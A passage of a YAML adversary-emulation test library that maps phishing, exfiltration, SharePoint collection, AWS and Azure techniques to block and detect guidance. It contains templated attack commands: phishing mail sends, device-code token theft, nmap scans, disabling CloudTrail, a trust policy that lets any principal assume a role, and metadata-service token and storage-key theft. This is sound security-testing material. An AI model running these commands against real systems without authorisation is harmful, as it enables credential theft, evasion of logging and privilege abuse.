    id: 858f2214-2039-4198-bf4f-ea52185578df
    tid: T1098.003
    tactic: TA0003
    x_vectr_id: 858f2214-2039-4198-bf4f-ea52185578df
    isv: 1
Initial Access:
- name: Email QR code to known bad
  description: Send a phishing email to a target containing a known bad link formatted as a QR code
  platforms:
  guidance:
  - PS> Send-MailMessage -SmtpServer {{ maildomain }} -UseSSL -BodyAsHTML -Subject {{ subject }} -Body {{ bodywithlink }} -To {{ rcpt }} -From {{ sender }}
  block:
  - Malicious email blocked/quarantined or link inside email rewritten/stripped by email gateway
  detect:
  - Malicious email alerted on by email gateway
  controls:
  - Mail Gateway
  metadata:
    id: c2f5218f-c5ae-4c1e-bfcd-cc80a8c64c35
    tid: T1566.002
    tactic: TA0001
    x_vectr_id: c2f5218f-c5ae-4c1e-bfcd-cc80a8c64c35
    isv: 1
- name: Email link to known bad
  description: Send a phishing email to a target containing a known bad link
  platforms:
  guidance:
  - PS> Send-MailMessage -SmtpServer {{ maildomain }} -UseSSL -BodyAsHTML -Subject {{ subject }} -Body {{ bodywithlink }} -To {{ rcpt }} -From {{ sender }}
  block:
  - Malicious email blocked/quarantined or link inside email rewritten/stripped by email gateway
  detect:
  - Malicious email alerted on by email gateway
  controls:
  - Mail Gateway
  metadata:
    id: 90223862-1524-4936-8abc-41771a7b847c
    tid: T1566.002
    tactic: TA0001
    x_vectr_id: 90223862-1524-4936-8abc-41771a7b847c
    isv: 1
- name: Attachment - Macro
  description: Send a spearphishing attachment containing a malicious macro payload to a target
  platforms:
  guidance:
  - PS> Send-MailMessage -SmtpServer {{ maildomain }} -UseSSL -BodyAsHTML -Subject {{ subject }} -Body {{ body }} -To {{ rcpt }} -From {{ sender }} -Attachments {{ attachment }}
  block:
  - Malicious email blocked/quarantined or attachment inside email stripped by email gateway
  detect:
  - Malicious email alerted on by email gateway
  controls:
  - Mail Gateway
  metadata:
    id: 0a348365-1f35-445c-baf0-a6687ddc3f40
    tid: T1566.001
    tactic: TA0001
    x_vectr_id: 0a348365-1f35-445c-baf0-a6687ddc3f40
    isv: 1
- name: Authentication via device code flow
  description: Have a user authenticate to the tenant using a device code flow
  platforms:
  guidance:
  - PS> Get-AzureToken -Client {{ client }}
  - Then login as the target user with the generated code
  block:
  - 'Disable device code authentication via conditional access policy authentication flow settings: https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-authentication-flows'
  detect:
  - Detect anomalous device code sign-ins (Authentication protocol -> "Device Code") using the Azure sign-in logs.
  - https://www.inversecos.com/2022/12/how-to-detect-malicious-oauth-device.html
  controls:
  - SIEM
  - Hardening
  metadata:
    id: 31dbbb09-4cad-47fc-a76d-8858b62a85d3
    tid: T1528
    tactic: TA0006
    x_tools:
    - https://github.com/rvrsh3ll/TokenTactics
    x_vectr_id: 31dbbb09-4cad-47fc-a76d-8858b62a85d3
    isv: 1
- name: Attachment - Smuggle ISO file in HTML
  description: Send an HTML attachment that will initiate the download of an ISO payload encoded in that page. HTML smuggling can be used to evade email-based security controls as well as link inspections.
  platforms:
  guidance:
  block:
  - Malicious email blocked/quarantined or attachment inside email stripped by email gateway
  detect:
  - Malicious email alerted on by email gateway
  controls:
  - Mail Gateway
  metadata:
    id: b0bde9c2-bfea-4dee-98ea-52652d5b0cb2
    tid: T1027.006
    tactic: TA0005
    x_vectr_id: b0bde9c2-bfea-4dee-98ea-52652d5b0cb2
    isv: 1
- name: Prompt a user with multiple MFA requests
  description: Using valid credentials for a user, prompt that user with multiple MFA requests in a short period of time in order to induce them to accept the prompt.
  platforms:
  guidance:
  block:
  - Enforce multi-factor authentication for all logins and require phishing-resistant factors like Yubikeys and Windows Hello for Business
  - Prevent sign-ins from users with anomalous login characteristics, such as an unknown geolocation or device fingerprint
  detect:
  - Baseline MFA requests for users using authentication logs then generate alerts for instances where the amount of MFA requests for a user significantly exceeds the baseline within a short time period (e.g. <1 hour).
  controls:
  - IdP
  - SIEM
  - Hardening
  metadata:
    id: ba6b3115-f8f6-4b28-bb24-ad5dfad6b4b7
    tid: T1621
    tactic: TA0006
    x_vectr_id: ba6b3115-f8f6-4b28-bb24-ad5dfad6b4b7
    isv: 1
- name: Phishing via external Teams tenant
  description: Send a phishing message to a target user via a Team tenant not connected to the target user's tenant
  platforms:
  guidance:
  block:
  - 'If possible, consider blocking inbound messages from external Teams tenants or only allowing inbound messages from approved tenants. Refer to Microsoft documentation for details: https://learn.microsoft.com/en-us/microsoftteams/trusted-organizations-external-meetings-chat'
  detect:
  - Use Teams audit logs to identify anomalous chat events from users in external tenants (https://techcommunity.microsoft.com/t5/microsoft-security-experts-blog/phish-click-breach-hunting-for-a-sophisticated-cyber-attack/ba-p/4267916)
  controls:
  - SIEM
  - Hardening
  metadata:
    id: fa190332-4419-4428-93f8-bdcfa5416902
    tid: T1566
    tactic: TA0001
    x_vectr_id: fa190332-4419-4428-93f8-bdcfa5416902
    isv: 1
- name: Log in to portal via AitM proxy
  description: Log in to an external portal from an adversary-in-the-middle proxy (such as Evilginx)
  platforms:
  guidance:
  block:
  - Enforce multi-factor authentication for all logins and require phishing-resistant factors like Yubikeys and Windows Hello for Business
  detect:
  - Detect sign-ins from users with anomalous login characteristics, such as an unknown geolocation or device fingerprint
  - Consider deploying layout-based canaries (e.g. CSS, images) on managed sign-in pages to detect when the page is loaded through an attacker's proxy
  controls:
  - SIEM
  metadata:
    id: a8a303b9-5b83-416c-bff1-34023ce6cd00
    tid: T1557
    tactic: TA0006
    x_tools:
    - https://github.com/kgretzky/evilginx2
    x_vectr_id: a8a303b9-5b83-416c-bff1-34023ce6cd00
    isv: 1
- name: Suspicious external employee login
  description: Log in to an external employee portal from an unexpected geolocation and with an unexpected user-agent to simulate a suspicious login attempt.
  platforms:
  guidance:
  block:
  - Suspicious logins originating from select geolocations are blocked
  - If using Entra Conditional Access Policies, use managed device enforcement and token binding features to restrict sign-ins to approved devices
  detect:
  - Baseline login events for users via authentication logs then generate alerts for instances where the logins occur from comparatively anomalous geolocations
  controls:
  - SIEM
  - IdP
  metadata:
    id: 609515fe-24e0-4bc2-a069-a3d815e68ec2
    tid: T1078
    tactic: TA0001
    x_vectr_id: 609515fe-24e0-4bc2-a069-a3d815e68ec2
    isv: 1
Exfiltration:
- name: Extract data to cloud storage service
  description: Extract data from the internal network to a cloud storage service like MEGA, Google Drive, or Box
  platforms:
  guidance:
  block:
  - Sensitive data sent over the network is blocked by network DLP tool
  - Network security tool detects connection to domain based on category from proxy or DNS
  detect:
  - Sensitive data sent over the network is detected by network DLP tool
  controls:
  - Firewall
  - DLP
  - Web Gateway
  metadata:
    id: 9b1ad734-9b2b-4e12-8a7c-dacd2cddfb66
    tid: T1567.002
    tactic: TA0010
    x_vectr_id: 9b1ad734-9b2b-4e12-8a7c-dacd2cddfb66
    isv: 1
- name: Extract sensitive data over HTTP C2
  description: Extract data from the network via an HTTP C2 channel over tcp/80 to external host or IP
  platforms:
  guidance:
  - implant> download {{ file }}
  block:
  - Sensitive data sent over the network is blocked by network DLP tool
  - C2 channel is blocked by proxy, firewall, or network behavioral/UEBA tool
  detect:
  - C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool
  controls:
  - Firewall
  - DLP
  - Web Gateway
  metadata:
    id: b48fa856-d004-4d5a-918f-d9429a9cd8e3
    tid: T1041
    tactic: TA0010
    x_vectr_id: b48fa856-d004-4d5a-918f-d9429a9cd8e3
    isv: 1
- name: Extract sensitive data via email
  description: Exfiltrate data from the internal network by sending it as an email attachment to an inbox outside of the tenant
  platforms:
  guidance:
  block:
  - Sensitive data sent over email is blocked by email-based DLP tool/controls
  detect:
  - Sensitive data sent over email is detected by email-based DLP tool/controls
  controls:
  - Mail Gateway
  - DLP
  metadata:
    id: 7ebe6256-1f2f-484f-a403-f69962dea303
    tid: T1048.001
    tactic: TA0010
    x_vectr_id: 7ebe6256-1f2f-484f-a403-f69962dea303
    isv: 1
Collection:
- name: Bulk data collection from SharePoint
  description: Download a large amount of files from SharePoint within a short time period
  platforms:
  guidance:
  block:
  - ''
  detect:
  - Use application logs to identify and detect anomalous data access patterns within SharePoint
  controls:
  - UEBA
  - SIEM
  metadata:
    id: 5fb2de9f-07ac-4947-8260-fc0df7208371
    tid: T1213.002
    tactic: TA0009
    x_vectr_id: 5fb2de9f-07ac-4947-8260-fc0df7208371
    isv: 1
- name: Search SharePoint for sensitive information
  description: Perform searches within SharePoint for documents containing sensitive information like passwords and personal information
  platforms:
  guidance:
  block:
  - ''
  detect:
  - Use application logs to identify and detect anomalous data access patterns within SharePoint
  controls:
  - UEBA
  - SIEM
  metadata:
    id: 8802c751-aa88-48b8-8f23-0d2166be1a52
    tid: T1213.002
    tactic: TA0009
    x_vectr_id: 8802c751-aa88-48b8-8f23-0d2166be1a52
    isv: 1
AWS:
- name: Instance credential compromise
  description: Compromise the instance role credentials associated with an EC2 instance then use them to perform API actions from outside of the instance
  platforms:
  - aws
  guidance:
  block:
  - ''
  detect:
  - Use CloudTrail logs to detect when a principal performs actions from an unexpected source, such as an EC2 instance role performing actions from a non-AWS IP
  - Detect anomalous API actions via GuardDuty's UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration finding types, which triggers when events occur from EC2 credentials outside AWS or the original account
  controls:
  - SIEM
  metadata:
    id: 434a6e87-77a7-4925-8042-445438debe71
    tid: T1552.005
    tactic: TA0006
    x_vectr_id: 434a6e87-77a7-4925-8042-445438debe71
    isv: 1
- name: Internal port scan from instance
  description: Perform a port scan from an EC2 instance against other instances on the same private network
  platforms:
  - aws
  guidance:
  - bash> nmap -sS -Pn --open -p80,8080,8443,443,445,3306,1433,5432 -oA {{ gen_outfile }} {{ target_cidr }}
  block:
  - Network security controls block source generating a large volume of connection requests
  detect:
  - Network security controls or the SIEM detect a source generating a large volume of connection requests by network traffic logs like switch logs and flow logs
  controls:
  - Firewall
  - ID/PS
  - Deception
  metadata:
    id: c69d537f-34b2-441e-bbc9-6a336375678f
    tid: T1046
    tactic: TA0007
    x_tools:
    - nmap
    x_vectr_id: c69d537f-34b2-441e-bbc9-6a336375678f
    isv: 1
- name: Disable a Trail
  description: Disable a trail in CloudTrail
  platforms:
  - aws
  guidance:
  - shell> aws cloudtrail stop-logging --name {{ trail_name }}
  block:
  - Manage trails from the Organization management account or a delegated administrator account to prevent members accounts from modifying trails
  detect:
  - Detect anomalous trail logging configuration changes by looking for the cloudtrail:StopLogging CloudTrail event
  - Use a CSPM-like tool to detect when an account is not configured with CloudTrail monitoring
  controls:
  - SIEM
  - Hardening
  - CSPM
  metadata:
    id: d7e8c37e-237f-4ff1-81dd-e623a0b269f2
    tid: T1562.008
    tactic: TA0005
    x_vectr_id: d7e8c37e-237f-4ff1-81dd-e623a0b269f2
    isv: 1
- name: Modify role trust relationship
  description: Add a statement to a role's trust policy to allow role assumption from any principal ("*")
  platforms:
  - aws
  guidance:
  - shell> aws iam update-assume-role-policy-document --role-name {{ role_name }} --policy--document file://{{ policy_file }}
  - "policy:\n{ \n  \"Version\": \"2012-10-17\", \n  \"Statement\": [ \n    { \n      \"Effect\": \"Allow\", \n      \"Principal\": { \n        \"AWS\": \"*\" \n      }, \n      \"Action\": \"sts:AssumeRole\" \n    } \n  ] \n} \n"
  block:
  - ''
  detect:
  - Detect anomalous role trust policy modification by looking for the iam:UpdateAssumeRolePolicy CloudTrail event
  - Use a CSPM-like tool to detect when an IAM role is configured with an overly-permissive trust policy
  controls:
  - SIEM
  - CSPM
  metadata:
    id: 88233370-02f3-4a34-9174-3bd704a9e333
    tid: T1098
    tactic: TA0003
    x_vectr_id: 88233370-02f3-4a34-9174-3bd704a9e333
    isv: 1
Azure:
- name: Virtual machine identity credential compromise
  description: Retrieve a virtual machine's identity credentials from the metadata service then interact with Azure APIs from another source
  platforms:
  - azure
  guidance:
  - "Request a token to interact with the management API\nshell> curl -H \"Metadata: true\" \"http://169.254.169.254/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\"\n\nList storage accounts\nshell> curl -H \"Authorization: Bearer {{ jwt_token }}\" \"https://management.azure.com/subscriptions/{{ subscription_id }}/providers/Microsoft.Storage/storageAccounts?api-version=2021-04-01\"\n\nGet keys from a storage account\nshell> curl -H \"Authorization: Bearer {{ jwt_token }}\" -X POST -d \"Content-Length: 0\" \"https://management.azure.com/subscriptions/{{ subscription_id }}/resourceGroups/{{ resource_group_name }}/providers/Microsoft.Storage/storageAccounts/{{ storage_account_name }}/listKeys?api-version=2021-04-01\"\n"
  block:
  - ''
  detect:
  - Use Azure activity logs to detect when a principal performs actions from an unexpected source, such as a virtual machine's identity performing actions from a non-Azure IP
  controls:
  - SIEM
  metadata:
    id: 4605314d-edb7-4948-bed9-675918aa0aca
    tid: T1552.005
    tactic: TA0006
    x_vectr_id: 4605314d-edb7-4948-bed9-675918aa0aca
    isv: 1
- name: Internal port scan from virtual machine
  description: Perform a port scan from a virtual machine against other virtual machines on the same private network
  platforms:
  - azure
  guidance:
  - shell> nmap -p445,80,8443,3306,21,22,23,1433,1521,1526,523,5432,623 -oA {{ gen_outfile }} {{ target_cidr }}
  block:
  - Network security controls block source generating a large volume of connection requests
  detect:
  - Network security controls or the SIEM detect a source generating a large volume of connection requests by network traffic logs like switch logs and flow logs
  controls:
  - Firewall
  - ID/PS
  - Deception
  metadata:
    id: ecdf0eeb-4e91-4330-bc38-6c642841e4e7
    tid: T1046
    tactic: TA0007
    x_tools:
    - nmap
    x_vectr_id: ecdf0eeb-4e91-4330-bc38-6c642841e4e7
    isv: 1
- name: Grant managed identity access to a resource group
  description: Grant a managed identity permissive access to a resource group
  platforms:
  - azure
  guidance:
  - shell> az role assignment create --assignee {{ assignee }} --role {{ role_name }} --scope "/subscriptions/{{ subscription_id }}/resourcegroups/{{ resource_group }}/"
  block:
  - ''
  detect:
  - Detect anomalous role assignment changes by looking for the Microsoft.Authorization/roleAssignments/write event then querying for the corresponding changes
  - Use a CSPM-like tool to detect when a principal is configured with an overly-permissive assignment(s)
  controls:
  - SIEM
  - CSPM
  metadata:
    id: 3dc08ef7-5883-468f-bb4c-f4b9bf3f6b2f
    tid: T1098
    tactic: TA0003
    x_vectr_id: 3dc08ef7-5883-468f-bb4c-f4b9bf3f6b2f
    isv: 1
- name: Disable Graph activity diagnostic log category
  description: Modify a diagnostic log to disable the "MicrosoftGraphActivityLogs" category.
  platforms:
  - azure
  guidance:
  - console> Navigate to Entra ID -> Monitoring -> Diagnostics settings -> Edit the diagnostic settings -> Uncheck the box for "MicrosoftGraphActivityLogs" -> Save
  block:
  detect:
  - https://samilamppu.com/2022/05/30/detect-azure-ad-diagnostics-setting-changes-in-microsoft-sentinel/
  - Monitor for actions occurring at unusual times or from unusual IP addresses, and correlate the events using the SIEM.
  controls:
  - CASB
  - SIEM
  - CSPM
  metadata:
    id: 71a732dc-ee42-4bb4-91ba-6f825b6fe6ae
    tid: T1562.008
    tactic: TA0005
    x_tools:
    - Azure CLI
    x_vectr_id: 71a732dc-ee42-4bb4-91ba-6f825b6fe6ae
    isv: 1
